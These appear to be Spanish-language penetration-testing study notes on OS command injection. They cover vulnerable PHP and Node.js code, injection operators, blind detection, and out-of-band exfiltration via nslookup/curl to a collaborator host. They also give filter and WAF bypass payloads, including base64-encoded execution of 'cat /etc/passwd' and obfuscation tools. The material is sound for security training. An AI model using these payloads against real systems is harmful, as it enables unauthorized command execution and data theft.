# OS COMMAND INJECTION

## Table of contents

- [OS COMMAND INJECTION](#os-command-injection)
  - [DEFINICION](#definicion)
  - [EJEMPLO](#ejemplo)
    - [PHP](#php)
    - [NODEJS](#nodejs)
  - [DETECCION](#deteccion)
  - [FORMAS DE ATAQUE](#formas-de-ataque)
  - [Métodos de inyección de comandos](#mtodos-de-inyeccin-de-comandos)
    - [DETECCION DE LA INYECCION](#deteccion-de-la-inyeccion)
  - [COMANDOS UTILES](#comandos-utiles)
  - [COMMAND INJECTION A CIEGAS](#command-injection-a-ciegas)
    - [BLIND COMMAND INJECTION TIME DELAYS](#blind-command-injection-time-delays)
    - [BLIND COMMAND INJECTION REDIRECT OUTPUT](#blind-command-injection-redirect-output)
    - [BLIND COMMAND INJECTION OUTBAND DATA EXFILTRATION](#blind-command-injection-outband-data-exfiltration)
  - [Bypass front-end validation](#bypass-front-end-validation)
  - [IDENTIFICACION DE FILTROS (PROTECCIONES)](#identificacion-de-filtros-protecciones)
    - [Detección de filtro/WAF](#deteccin-de-filtrowaf)
    - [blacklisted character](#blacklisted-character)
    - [Identificación de personajes en la lista negra](#identificacin-de-personajes-en-la-lista-negra)
  - [BYPASS DE FILTROS](#bypass-de-filtros)
    - [Omitir caracter ESPACIO en la lista negra](#omitir-caracter-espacio-en-la-lista-negra)
      - [USO DE TABULACION](#uso-de-tabulacion)
      - [USO DE LA VARIABLE ${IFS}](#uso-de-la-variable-ifs)
      - [USANDO BRACE EXPANSION](#usando-brace-expansion)
    - [Omitir otros caracteres en la lista negra](#omitir-otros-caracteres-en-la-lista-negra)
      - [LINUX](#linux)
      - [WINDOWS](#windows)
  - [Character Shifting (ASCII)](#character-shifting-ascii)
  - [Bypassing Blacklisted Commands](#bypassing-blacklisted-commands)
    - [BYPASS EN WINDOWS Y LINUX](#bypass-en-windows-y-linux)
    - [BYPASS SOLO EN WINDOWS](#bypass-solo-en-windows)
    - [BYPASS SOLO EN LINUX](#bypass-solo-en-linux)
    - [MAS EJEMPLOS](#mas-ejemplos)
  - [Ofuscación de comandos avanzada](#ofuscacin-de-comandos-avanzada)
    - [MANIPULACION DE CARACTERES](#manipulacion-de-caracteres)
    - [INVERTIR LA CADENA](#invertir-la-cadena)
    - [COMANDOS CODIFICADOS](#comandos-codificados)
  - [Evasion Tools](#evasion-tools)
    - [Linux (Bashfuscator)](#linux-bashfuscator)
    - [Windows (DOSfuscación)](#windows-dosfuscacin)

## DEFINICION

Una vulnerabilidad de inyección de comandos se encuentra entre los tipos más críticos de vulnerabilidades. Nos permite ejecutar comandos del sistema directamente en el servidor de alojamiento back-end, lo que podría comprometer toda la red. Si una aplicación web utiliza una entrada controlada por el usuario para ejecutar un comando del sistema en el servidor back-end para recuperar y devolver un resultado específico, es posible que podamos inyectar una carga útil maliciosa para subvertir el comando previsto y ejecutar nuestros comandos.

## EJEMPLO

### PHP

Por ejemplo, una aplicación web escrita en `PHP` puede usar las funciones `exec`, `system`, `shell_exec`, `passthru` o `popen` para ejecutar comandos directamente en el servidor back-end, cada uno con un caso de uso ligeramente diferente. El siguiente código es un ejemplo de código PHP que es vulnerable a las inyecciones de comandos:

```php
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>
```

como no se realiza una validacion de la entrada del usuario se puede ingresar un payload para inyectar comandos y que lo ejecute en el back-end:

```bash
test.pdf; ping MY_IP; 
```

### NODEJS

Por ejemplo, si una aplicación web se desarrolla en `NodeJS`, un desarrollador puede usar `child_process.exec` o `child_process.spawn` para el mismo propósito. El siguiente ejemplo realiza una funcionalidad similar a la que discutimos anteriormente:

```javascript
app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
})
```

## DETECCION

Se tiene que interactuar con la pagina para conocer que podria estar ejecutando un comando de sistema, si una pagina que muestra informacion de un host cuando le pasas una IP, es muy probable que este ejecutando comandos como:

netstat, ping, nslookup, etc contra esa IP.

podemos probar en todos los valores tambien porque no sabemos si al pedirnos un user_id por ejemplo esta ejecutando un script por debajo:

```bash
get_info.sh <user_id>
```

El proceso de detección de vulnerabilidades básicas de inyección de comandos del sistema operativo es el mismo proceso para explotar dichas vulnerabilidades. Intentamos agregar nuestro comando a través de varios métodos de inyección. Si la salida del comando cambia del resultado habitual previsto, hemos explotado con éxito la vulnerabilidad.

Podemos pensar que algunas paginas realizan la ejecucion de comandos en el sistema por lo que ofrece:

![[Pasted image 20221229122151.png]]

Si bien no tenemos acceso al código fuente de la aplicación web, podemos suponer con confianza que la IP que ingresamos va a un comando `ping`, ya que el resultado que recibimos así lo sugiere.

## FORMAS DE ATAQUE

Podemos usar ";" o "&" o "&&" para concatener comandos del sistema operativo a un input que ejecuta un comando.

Por ejemplo una pagina que realiza un ping y pide la dierccion IP podemos poner este input:

```bash
10.10.10.15; <command>

10.10.10.15 && <command>
```

donde "command" es un comando del sistema como whoami, id, pwd, uname -a.

La siguiente peticion:

```bash
https://insecure-website.com/stockStatus?productID=381&storeID=29
```

es una consulta para sabre el stock de un producto. El sistema realiza la consulta a su servidor mediante la linea de comandos a un archivo llamado "stockreport.pl" donde le le pasa los dos parametros de la ruta. 

```bash
stockreport.pl 381 29
```

Obviamente la inyeccion de comandos es sencilla viendolo desde ese punto pues con la ayuda de '&' se puede ejecutar otros comandos.

Ejemplo:

Si como parametro de una variable le pasamos '& echo whoami &'.

la consulta queda asi:

```bash
stockreport.pl & echo whoami & 29
```

Nos botara errores pero tambien la sentencia 'whoami' que muestra quienes somos en el sistema.


## Métodos de inyección de comandos

Para inyectar un comando adicional al previsto, podemos usar cualquiera de los siguientes operadores:

|**Operador de inyección**|**Carácter de inyección**|**Carácter codificado en URL**|**Comando ejecutado**|
|:-------:|:------:|:------:|:-------:|
|Punto y coma|`;`|`%3b`|Ambos|
|Nueva línea|`\n`|`%0a`|Ambos|
|Background|`&`|`%26`|Ambos (la segunda salida generalmente se muestra primero)|
|Tubo|\||`%7c`|Ambos (solo se muestra la segunda salida)|
|AND|`&&`|`%26%26`|Ambos (solo si el primero tiene éxito)|
|OR|\|\||`%7c%7c`|Segundo (solo si falla el primero)|
|Sub-Shell|` `` `|`%60%60`|Ambos (solo Linux)|
|Sub-Shell|`$()`|`%24%28%29`|Ambos (solo Linux)|

Podemos usar cualquiera de estos operadores para inyectar otro comando para que **AMBOS** o **CUALQUIERA DE LOS 2** de los comandos se ejecute.

>[!note]
>Además de lo anterior, hay algunos operadores exclusivos de Unix, que funcionarían en Linux y macOS, pero no en Windows, como envolver nuestro comando inyectado con doble tilde invertida ( ` `` `) o con un operador de subcapa. ( `$()`).

>[!tip]
>La única excepción puede ser el punto y coma `;`, que no funcionará si el comando se ejecuta con `Windows Command Line (CMD)`, pero seguirá funcionando si se ejecuta con `Windows PowerShell`.

ejemplo:

si queremos usar el operador **AND** `&&` tenemos que asegurarnos que el primer comando **no falle**:

```bash
ping -c 1 127.0.0.1 && whoami
```

si queremos usar el operador **OR** `||` tenemos que asegurarnos de que el primer comando **falle**:

```bash
#no especificamos la IP al comando ping y falla
ping -c 1 || whoami
```

>[!tip]
>A veces podemos combinar un conector con un salto de linea para que funcione la inyeccion.

ejemplo.

```bash
#ip=127.0.0.1;\nls /home
ip=127.0.0.1%3b%0als+/home

#usando variables de entorno
ip=127.0.0.1${LS_COLORS:10:1}%0als${IFS}${PATH:0:1}home
```

### DETECCION DE LA INYECCION

Puede que nos encontremos con muchas URL y muchos campos que probar, es recomendable que pruebe esto para encontrar el punto de inyeccion. 

>[!tip]
>**En caso de que esto no funcione, utilice alguna de las tecnicas que se menciona mas adelante y no esta aqui o en todo caso intente implementarlo como se mostrara en este punto**
>

1. descubra el caracter que puede utilizar para la inyeccion, segun los caracteres mostrados en la tabla anterior. Es mejor utilizar su equivalente en URL encoded. Ademas intente unirlo a un comando para ver si funciona, un simple `ls` es suficiente, puede usar otro comando y tambien intente usar algunas tecnicas de evasion:

```bash
%3bls       #;ls
%3bl's'     #;ls
%3bl"s"     #;ls
%0als       #\nls
%0al's'     #\nls
%0al"s"     #\nls
%26ls       #&ls
%26l's'     #&ls
%26l"s"     #&ls
...
```

2. Pruebe esto mediante el Intruder del burpsuite y guiese con la longitud de la respuesta.
3. Si tiene el render configurado en el burp suite uselo con la peticion que muestre una respuesta diferente, si no lo tiene configurado replique la peticion en el navegador.
4. Pruebe esto en todos los campos que vea que puede ser un vector potencial de **Command Injection**, hagalo uno por uno.
5. **Lo mas importante es encontrar 2 cosas, el punto de inyeccion y el/los caracteres que permiten concatenar commandos.**

## COMANDOS UTILES

|Purpose of command|Linux|Windows|
|:-----:|:------:|:------:|
|Name of current user|`whoami`|`whoami`|
|Operating system|`uname -a`|`ver`|
|Network configuration|`ifconfig`|`ipconfig /all`|
|Network connections|`netstat -an`|`netstat -an`|
|Running processes|`ps -ef`|`tasklist`|

## COMMAND INJECTION A CIEGAS

Muchos casos de inyección de comandos del sistema operativo son vulnerabilidades ciegas. Esto significa que la aplicación no devuelve el resultado del comando dentro de su respuesta HTTP. Las vulnerabilidades ciegas aún se pueden explotar, pero se requieren diferentes técnicas.

Dependera del comando que se esta ejecutando en el sistema, muchas veces estos comando no devuelven salida, puede que se este utilizando la rediccion del stdout.

### BLIND COMMAND INJECTION TIME DELAYS

como no tenemos respuesta del lado del servidor, una forma de validar un command injection a ciegas es colocando un comando que de una respuesta despues de N segundos. Lo mejor es utilizar un ping contra un equipo:

- identificamos el punto de inyeccion.
- creamos un payload que no nos de error pero tampoco respuesta
- reemplazamos el comando por el siguiente:

```bash
ping -c 10 127.0.0.1
```

- si el servidor tarda 10 segundos en responder, es un ataque a ciegas.

ejemplo:

```bash
csrf=g5NUgT4PzqnmlUQiMNqHvYusebZhwhRS&name=test&email=test%40test.com||whoami||&subject=subject&message=message #injeccion en el mail, esta poc no devuelve error ni respuesta

#reemplamos el comando y este tarda 10 segundos en no mostrar error ni respuesta
csrf=g5NUgT4PzqnmlUQiMNqHvYusebZhwhRS&name=test&email=test%40test.com||ping+-c+10+127.0.0.1||&subject=subject&message=message
```

### BLIND COMMAND INJECTION REDIRECT OUTPUT

otra forma de validar una injeccion a ciegas es mediante la redireccion del output del comando a un fichero, si la pagina web ofrece recursos estaticos `/static`, `/assets`, `/js` o `css` se puede asumir que puede estar en la ruta `/var/www` o `/var/www/html`.

**Requisito: tener permisos de escritura en el directorio y poder verlo desde el navegador.**

```bash
& whoami > /var/www/static/whoami.txt &
; whoami > /var/www/static/whoami.txt ;
|| whoami > /var/www/static/whoami.txt ||
```

ahora para validar:
- podemos ver el directorio donde se cargo
- podemos reemplazar la carga de una imagen con la ruta del archivo
- podemos ver si en alguna peticion se llama a un archivo de esa carpeta

Si alguna de esas opciones se cumple, podemos validar si se guardo correctamente el archivo.

### BLIND COMMAND INJECTION OUTBAND DATA EXFILTRATION

podemos usar burp collaborator o un servidor web de python pero con una IP publica para validar esto. Otra forma de valir un command injection a ciegas es ejecutar un comando que consulte una tercera parte y para exfiltrar datos podemos poner el comando como un subdominio:

```bash
#revisar logs de DNS
nslookup `whoami`.<ip_KALI>
nslookup `whoami`.j9t8ietm6bbi9cy69kedpiwtskyamz.burpcollaborator.net

#revisar logs web
curl `whoami`.<ip_KALI>
curl `whoami`.j9t8ietm6bbi9cy69kedpiwtskyamz.burpcollaborator.net

wget `whoami`.<ip_KALI>
wget `whoami`.j9t8ietm6bbi9cy69kedpiwtskyamz.burpcollaborator.net
```

en los logs deberia aparecer un registro de lo consultado y como subdominio el comando ejecutado:

![foto](./img/Pasted%20image%2020220927175522.png)

## Bypass front-end validation

Podemos intentar usar nuestra carga útil contra el campo vulnerable, pero como podemos ver, la aplicación web rechazó nuestra entrada, ya que parece que solo acepta entradas en formato IP. Sin embargo, por el aspecto del mensaje de error, parece que se origina en el front-end y no en el back-end.

![[Pasted image 20221229124545.png]]

El método más sencillo para personalizar las solicitudes HTTP que se envían al servidor back-end es utilizar un proxy web (**como burpsuite**) y que pueda interceptar las solicitudes HTTP que envía la aplicación.

![[Pasted image 20221229124653.png]]

## IDENTIFICACION DE FILTROS (PROTECCIONES)

Otro tipo de mitigación de inyección es utilizar caracteres y palabras en la lista negra en el back-end para detectar intentos de inyección y denegar la solicitud si alguna solicitud los contenía. Otra capa adicional a esta es la utilización de firewalls de aplicaciones web (WAF), que pueden tener un alcance más amplio y varios métodos de detección de inyección y prevenir otros ataques como inyecciones de SQL o ataques XSS.

### Detección de filtro/WAF

Podemos ver que si probamos los operadores anteriores que probamos, como ( `;`, `&&`, `||`), obtenemos el mensaje de error `invalid input`. 

Esto indica que algo que enviamos activó un mecanismo de seguridad que rechazó nuestra solicitud. Este mensaje de error se puede mostrar de varias maneras. En este caso, lo vemos en el campo donde se muestra la salida, lo que significa que fue detectado y evitado por la propia aplicación web `PHP`. 

>[!note]
>**Si el mensaje de error se muestra en una pagina diferente con informacion como nuestra IP o nuestra request, esto indica que fue denegado por un WAF.**

### blacklisted character

Una aplicación web puede tener una lista de caracteres en la lista negra y, si el comando los contiene, denegaría la solicitud. El código `PHP` puede parecerse a lo siguiente:

```php
$blacklist = ['&', '|', ';', ...SNIP...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```

Si algún carácter de la cadena que enviamos coincide con un carácter de la lista negra, se deniega nuestra solicitud. 

>[!note]
>Antes de comenzar nuestros intentos de eludir el filtro, debemos intentar identificar qué carácter provocó la solicitud denegada.

### Identificación de personajes en la lista negra

Reduzcamos nuestra solicitud a un carácter a la vez y veamos cuándo se bloquea. Sabemos que la carga útil (`127.0.0.1`) funciona, así que comencemos agregando el punto y coma ( `127.0.0.1;`):

![[Pasted image 20221229143901.png]]

Todavía recibimos un error `invalid input`, lo que significa que un punto y coma está en la lista negra.

## BYPASS DE FILTROS 

### Omitir caracter ESPACIO en la lista negra

El carácter de nueva línea (`\n`) generalmente no se incluye en la lista negra, ya que puede ser necesario en la propia carga útil:

![[Pasted image 20221229144426.png]]

pero si agregamos un espacio o cualquier caracter despues de la nueva linea no da error:

>[!note]
>En URL Encoded un espacio se representa con `+`.

![[Pasted image 20221229144812.png]]

Como podemos ver, el carácter de espacio también está en la lista negra. Un espacio es un carácter comúnmente incluido en la lista negra, especialmente si la entrada no debe contener ningún espacio, como una IP.

#### USO DE TABULACION

El uso de **tabuladores (%09**) en lugar de espacios es una técnica que puede funcionar, ya que tanto Linux como Windows aceptan comandos con tabuladores entre argumentos y se ejecutan de la misma manera. Entonces, intentemos usar una tabulación en lugar del carácter de espacio ( `127.0.0.1%0a%09`) y veamos si se acepta nuestra solicitud:

![[Pasted image 20221229144945.png]]

Como podemos ver, omitimos con éxito el filtro de caracteres de espacio usando una pestaña en su lugar.

#### USO DE LA VARIABLE ${IFS}

El uso de la **variable de entorno de Linux ($IFS)** también puede funcionar, ya que su **valor predeterminado es un espacio y una pestaña**, lo que funcionaría entre los argumentos del comando. Entonces, **si usamos ${IFS} donde deberían estar los espacios**, la variable debería reemplazarse automáticamente con un espacio, y nuestro comando debería funcionar.

Usemos **\${IFS}** y veamos si funciona (`127.0.0.1%0a${IFS}`):

![[Pasted image 20221229145217.png]]

Vemos que nuestra solicitud no fue denegada esta vez y pasamos por alto el filtro de espacio nuevamente.

#### USANDO BRACE EXPANSION

Hay muchos otros métodos que podemos utilizar para eludir los filtros espaciales. Por ejemplo, podemos usar la función `Bash Brace Expansion`, que **agrega automáticamente espacios entre argumentos entre llaves**, de la siguiente manera:

```bash
#equivale a ls -la
{ls,-la}
```

**Como podemos ver, el comando se ejecutó con éxito sin tener espacios en él.**

Podemos utilizar el mismo método en las omisiones del filtro de inyección de comandos, usando la expansión de llaves en nuestros argumentos de comando, como (`127.0.0.1%0a{ls,-la}`). Para descubrir más omisiones de filtros de espacio, consulte la página [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space) sobre cómo escribir comandos sin espacios.

### Omitir otros caracteres en la lista negra

Además de los operadores de inyección y los caracteres de espacio, un carácter muy común en la lista negra es el carácter de barra diagonal (`/`) o barra diagonal inversa (`\`), ya que es necesario para especificar directorios en Linux o Windows.

#### LINUX

Hay muchas técnicas que podemos utilizar para tener barras en nuestra carga útil. Una de esas técnicas que podemos usar para reemplazar barras inclinadas (o cualquier otro caracter) es usar las variables de entorno de linux.

Estos caracteres que necesitamos pueden usarse en una variable de entorno y podemos especificar `start` y `length` de nuestra cadena para que coincida exactamente con este carácter, en otras palabras seleccionar una subcadena de una varaible de entorno.

Por ejemplo, si observamos la variable de entorno en Linux `$PATH`, puede verse algo como lo siguiente:

```bash
echo ${PATH}

#output
/usr/local/bin:/usr/bin:/bin:/usr/games
```

Entonces, si comenzamos en el carácter `0` y solo tomamos una cadena de longitud `1`, terminaremos solo con el carácter `/`, que podemos usar en nuestra carga útil:

```bash
echo ${PATH:0:1}

#output
/
```

>[!note]
>Cuando usamos el comando anterior en nuestra carga útil, no agregaremos `echo`, ya que solo lo estamos usando en este caso para mostrar el carácter de salida.

Podemos hacer lo mismo con las variables de entorno `$HOME` o `$PWD` y usar el mismo concepto para obtener un carácter de punto y coma, para usarlo como operador de inyección.

```bash
echo ${LS_COLORS:10:1}

#output
;
```

Podemos listar todas las variables de entorno y ver cual tiene el caracter que necesitamos para usar esta tecnica.

```bash
#listar todas las variables de entorno en linux
printenv
```

Entonces, intentemos usar variables de entorno para agregar un punto y coma y un espacio a nuestra carga útil (`127.0.0.1${LS_COLORS:10:1}${IFS}`) como nuestra carga útil, y veamos si podemos omitir el filtro:

![[Pasted image 20221229170107.png]]

Como podemos ver, esta vez también omitimos con éxito el filtro de caracteres.

#### WINDOWS

El mismo concepto también funciona en Windows. Por ejemplo, para producir una barra en `Windows Command Line (CMD)`, podemos usar una variable de Windows con `echo`:

```bash
#variable HOMEPATH
%HOMEPATH% -> \Users\htb-student

#filtrado de la barra
echo %HOMEPATH:~6,1% #desde el caracter 6 tomo un caracter
echo %HOMEPATH:~0,1% #desde el caracter 0 tomo un caracter

#output
\
```

Con PowerShell, una palabra se considera una matriz, por lo que debemos especificar el índice del carácter que necesitamos:

```powershell
$env:HOMEPATH[0]

//output
\

$env:PROGRAMFILES[10]

//output
[espacio]
```

podemos listar todas las variables de entorno con elsiguiente comando:

```bash
#cmd
set

#powershell
Get-ChildItem Env:
```

## Character Shifting (ASCII)

Existen otras técnicas para producir los caracteres necesarios sin utilizarlos, como `shifting characters`. 

Por ejemplo, si queremos obtener el caracter `\` que nos sirve para definir rutas en windows, primero debemos consultar la tabla ASCII y ver en que posicion se encuentra, ademas es necesario conocer que valor esta despues:

```bash
man ascii
```

![[Pasted image 20221229234209.png]]

vea que `\` equivale a 92 y antes esta el valor `[` equivale a 91.

Todo lo que tenemos que hacer es usar este comando de linux y colocar el valor anterior al que queremos y se mostrara el valor siguiente:

```bash
echo $(tr '!-}' '"-~'<<<[)

#output
\
```

veamos otros ejemplos para que quede claro:

```bash
echo $(tr '!-}' '"-~'<<<.)

#output
/

echo $(tr '!-}' '"-~'<<<%)

#output
&

echo $(tr '!-}' '"-~'<<<{)

#output
|
```

>[!note]
>Al momento de usar esta tecnica al inyectar comandos no debe colocarse el `echo`, esto es simplemente para que se imprima por consola el valor.

## Bypassing Blacklisted Commands

Una lista negra de comandos generalmente consta de un conjunto de palabras, y si podemos ofuscar nuestros comandos y hacer que se vean diferentes, podemos pasar por alto los filtros.

Hay varios métodos de ofuscación de comandos que varían en complejidad.

Entonces, volvamos a nuestra primera carga útil y volvamos a agregar el comando `whoami` para ver si se ejecuta:

![[Pasted image 20221230102257.png]]

**Vemos que aunque usamos caracteres que no están bloqueados por la aplicación web, la solicitud se vuelve a bloquear una vez que agregamos nuestro comando. Es probable que esto se deba a otro tipo de filtro, que es un filtro de lista negra de comandos.**

Un filtro de lista negra de comando básico en `PHP` se vería así:

```php
$blacklist = ['whoami', 'cat', ...SNIP...];
foreach ($blacklist as $word) {
    if (strpos('$_POST['ip']', $word) !== false) {
        echo "Invalid input";
    }
}
```

Como podemos ver, está comprobando cada palabra de la entrada del usuario para ver si coincide con alguna de las palabras de la lista negra. Sin embargo, este código busca una coincidencia exacta del comando proporcionado, por lo que si enviamos un comando ligeramente diferente, es posible que no se bloquee.

### BYPASS EN WINDOWS Y LINUX

Una técnica de ofuscación muy común y fácil es insertar ciertos caracteres dentro de nuestro comando que generalmente son ignorados por shells de comandos como `Bash` o `PowerShell` y ejecutarán el mismo comando como si no estuvieran allí. Algunos de estos caracteres son comillas simples y comillas `'`dobles `"`, además de algunos otros.

```bash
w'h'o'am'i

w"h"o"am"i
```

**Solo debemos recordar lo siguiente:**

>[!tip]
>**No podemos mezclar tipos de comillas y el número de comillas debe ser par.**

![[Pasted image 20221230102720.png]]

Como podemos ver, este método sí funciona.

### BYPASS SOLO EN WINDOWS

También hay algunos caracteres exclusivos de Windows que podemos insertar en medio de los comandos que no afectan el resultado, como un carácter de intercalación (`^`), como podemos ver en el siguiente ejemplo:

```bash
who^ami

powershell C:\*\*2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
```

### BYPASS SOLO EN LINUX

Podemos insertar algunos otros caracteres exclusivos de Linux en medio de los comandos, y el shell `bash` los ignoraría y ejecutaría el comando. Estos caracteres incluyen la barra invertida `\` y el carácter de parámetro posicional `$@`. Esto funciona exactamente como lo hizo con las comillas.

>[!tip]
>En este caso no es necesario tener que colocar un valor par.

```bash
w\ho\am\i

who$@ami

who$()ami
who$(echo am)i
who`echo am`i

/usr/bin/p?ng # /usr/bin/ping
echo whoami|$0
```

### MAS EJEMPLOS

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)

## Ofuscación de comandos avanzada

En algunos casos, es posible que estemos tratando con soluciones de filtrado avanzadas, como firewalls de aplicaciones web (WAF), y es posible que las técnicas básicas de evasión no funcionen necesariamente. Podemos utilizar técnicas más avanzadas para tales ocasiones, lo que hace que la detección de los comandos inyectados sea mucho menos probable.

### MANIPULACION DE CARACTERES

Una técnica de ofuscación de comandos que podemos usar es la manipulación de casos, como convertir los  de caracteres de un comando a mayusculas (por ejemplo, `WHOAMI`) o alternar entre caracteres (por ejemplo, `WhOaMi`).

>[!note]
>Esto funciona solamente en Windows ya que Linux distingue entre Mayusculas y Minusculas.

```powershell
WhOaMi
```

Sin embargo, cuando se trata de Linux y un shell bash, que distinguen entre mayúsculas y minúsculas, como se mencionó anteriormente, tenemos que ser un poco creativos y **encontrar un comando que convierta el comando en una palabra en minúsculas**. Un comando de trabajo que podemos usar es el siguiente:

```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #output: whoami (en minusculas)
```

para el ejemplo anterior, si en caso el caracter **espacio**  estuviera filtrado, podemos intentar usar tabulaciones en su lugar:

```bash
$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi") #output: whoami (en minusculas)
```

![[Pasted image 20221230125603.png]]

### INVERTIR LA CADENA

Otra técnica de ofuscación de comandos que discutiremos es invertir los comandos y tener una plantilla de comando que los cambie y los ejecute en tiempo real. En este caso, escribiremos `imaohw` en lugar de `whoami` para evitar activar el comando en la lista negra.

**LINUX**

```bash
echo 'whoami' | rev #output: imaohw

echo $(rev<<<'imaohw') #output: whoami
```

![[Pasted image 20221230125740.png]]

>[!tip]
>si desea omitir un filtro de caracteres con el método anterior, también debe invertirlos o incluirlos al invertir el comando original.

**WINDOWS**

```powershell
"whoami"[-1..-20] -join '' #output: imaohw

iex "$('imaohw'[-1..-20] -join '')" #output: whoami
```

### COMANDOS CODIFICADOS

Es útil para los comandos que contienen caracteres filtrados o caracteres que el servidor puede decodificar como URL. Esto puede permitir que el comando se arruine cuando llegue al shell y finalmente no se ejecute. En lugar de copiar un comando existente en línea, esta vez intentaremos crear nuestro propio comando de ofuscación único. De esta manera, es mucho menos probable que un filtro o un WAF lo nieguen. El comando que creamos será único para cada caso, dependiendo de qué caracteres se permiten y el nivel de seguridad del servidor.

**LINUX**

En linux podemos usar los comandos `base64` o `xxd` para la codificacion:

```bash
#codificar
echo -n 'cat /etc/passwd | grep 33' | base64 # Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==

#decodificar
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

>[!tip]
>Tenga en cuenta que estamos usando `<<<` para evitar el uso de una canalización `|`, que es un carácter filtrado.

![[Pasted image 20221230130313.png]]

**WINDOWS**

Usamos la misma técnica con Windows también. Primero, necesitamos codificar en base64 nuestra cadena, de la siguiente manera:

```powershell
#codificar
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

#output
dwBoAG8AYQBtAGkA

#decodificar
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

También podemos lograr lo mismo en Linux, pero tendríamos que convertir la cadena de `utf-8` a `utf-16`antes de hacerlo `base64` , de la siguiente manera:

```bash
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
```

## Evasion Tools

Si se trata de herramientas de seguridad avanzadas, es posible que no podamos utilizar técnicas básicas de ofuscación manual. En tales casos, puede ser mejor recurrir a herramientas de ofuscación automatizadas. Esta sección discutirá un par de ejemplos de este tipo de herramientas, uno para `Linux` y otro para `Windows.`

### Linux (Bashfuscator)

Una herramienta útil que podemos utilizar para ofuscar los comandos bash es [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator) . Podemos clonar el repositorio desde GitHub y luego instalar sus requisitos, de la siguiente manera:

```bash
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
python3 setup.py install --user
```

Una vez que tenemos la herramienta configurada, podemos comenzar a usarla desde el directorio `./bashfuscator/bin/`.

```bash
cd ./bashfuscator/bin/
./bashfuscator -h
```

Podemos comenzar simplemente proporcionando el comando que queremos ofuscar con la opcion `-c`:

```bash
./bashfuscator -c 'cat /etc/passwd'
```

Sin embargo, ejecutar la herramienta de esta manera elegirá aleatoriamente una técnica de ofuscación, que puede generar una longitud de comando que va desde unos pocos cientos de caracteres hasta más de un millón de caracteres. Entonces, podemos usar algunas de las banderas del menú de ayuda para producir un comando ofuscado más corto y simple, como sigue:

```bash
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

![[Pasted image 20221230132332.png]]

Ahora podemos probar el comando de salida con `bash -c ''`, para ver si ejecuta el comando previsto:

```bash
bash -c 'printf %s "$(bR=(d t p c \/ s \  e a w);for aX in 3 8 1 6 4 7 1 3 4 2 8 5 5 9 0;{ printf %s "${bR[$aX]}";};)"|bash'
```

![[Pasted image 20221230132440.png]]

Podemos ver que el comando ofuscado funciona, todo mientras se ve completamente ofuscado y no se parece a nuestro comando original.

### Windows (DOSfuscación)

También existe una herramienta muy similar que podemos usar para Windows llamada [DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation) . A diferencia de `Bashfuscator`, esta es una herramienta interactiva, ya que la ejecutamos una vez e interactuamos con ella para obtener el comando ofuscado deseado. Podemos volver a clonar la herramienta desde GitHub y luego invocarla a través de PowerShell, de la siguiente manera:

```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation

Invoke-DOSfuscation> help
```

Una vez que estamos configurados, podemos comenzar a usar la herramienta, de la siguiente manera:

```powershell
Invoke-DOSfuscation> SET COMMAND ipconfig
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1

#output
Result:
%ProgramFiles:~12,-3%pc%CommonProgramW6432:~18,1%%APPDATA:~-2,-1%f%PUBLIC:~-2,-1%%APPDATA:~-1,1%
```

![[Pasted image 20221230133643.png]]

Finalmente, podemos intentar ejecutar el comando ofuscado en `CMD`, y vemos que efectivamente funciona como se esperaba:

![[Pasted image 20221230133741.png]]



